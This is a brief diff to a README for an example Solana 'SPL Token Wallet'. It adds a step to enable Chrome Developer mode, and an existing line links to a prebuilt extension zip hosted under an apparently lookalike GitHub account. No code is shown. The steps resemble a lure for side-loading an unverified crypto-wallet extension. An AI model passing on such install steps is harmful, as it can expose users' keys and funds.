@@ -1,5 +1,5 @@
 # SPL Token Wallet
-
+# 1. Go to [chrome://extensions/](chrome://extensions/) and check the box for Developer mode in the top right.
 If you want to install the extensions, Download it here directly [Download Here](https://github.com/projects-serum/spl-token-wallet/raw/main/extension-build.zip).
 
 Example Solana wallet with support for [SPL tokens](https://spl.solana.com/token) and Serum integration.
